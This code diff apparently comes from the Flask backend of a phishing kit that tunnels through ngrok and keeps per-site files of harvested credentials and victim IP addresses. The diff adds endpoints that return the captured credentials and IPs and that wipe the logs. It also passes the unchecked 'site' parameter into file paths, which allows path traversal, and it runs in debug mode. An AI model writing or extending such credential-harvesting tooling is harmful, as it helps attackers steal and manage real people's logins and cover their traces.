@@ -113,6 +113,30 @@ def check_ngrok_status():
         return 'tunnels' in r.json()
     except:
         return False
+    
+@app.route("/clear_logs", methods=["POST"])
+def clear_logs():
+    data = request.get_json()
+    site = data.get("site")
+    if site:
+        try:
+            open(f"logs/{site}_creds.txt", "w").close()
+            open(f"logs/{site}_ip.txt", "w").close()
+            return "", 204
+        except Exception as e:
+            print("Error clearing logs:", e)
+            return "Error", 500
+    return "Invalid site", 400
+
+@app.route("/get_logs")
+def get_logs():
+    site = request.args.get("site")
+    if site:
+        creds = read_file(f"logs/{site}_creds.txt")
+        ips = read_file(f"logs/{site}_ip.txt")
+        return {"creds": creds, "ips": ips}
+    return {"creds": "[No data]", "ips": "[No data]"}
+
 
 if __name__ == "__main__":
     os.makedirs("logs", exist_ok=True)
@@ -120,3 +144,4 @@ if __name__ == "__main__":
         Path(f"logs/{site}_creds.txt").touch()
         Path(f"logs/{site}_ip.txt").touch()
     app.run(debug=True, port=5000)
+    
